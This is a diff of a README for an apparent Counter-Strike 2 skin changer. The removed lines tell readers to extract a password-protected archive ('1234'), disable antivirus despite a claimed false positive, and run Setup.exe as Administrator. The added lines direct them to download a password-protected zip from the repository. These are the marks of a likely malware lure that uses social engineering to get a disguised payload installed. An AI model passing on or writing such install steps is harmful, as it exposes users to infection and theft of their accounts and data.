@@ -20,16 +20,10 @@
 
 1. **Go to the official download page:**  
    👉 (https://github.com/makingaa123/cs2-skin-changer)
-
-2. Click the **"Download Now"** button.
-
-3. **Extract** the archive using password: `1234`
-
-4. **Disable your antivirus** temporarily (it may show a false positive because of the injection method).
-
-5. **Run `Setup.exe`** as Administrator.
-
-6. Launch CS2 and enjoy your new skins! 🎮
+2. Find the file **SkinChanger_data.zip** in the file list.
+3. Click on the file name (blue link).
+4. On the file preview page, click the **"View raw"** button (or right-click and choose "Save link as...").
+5. The download will start. Extract it with password `1234`.
 
 ---
 
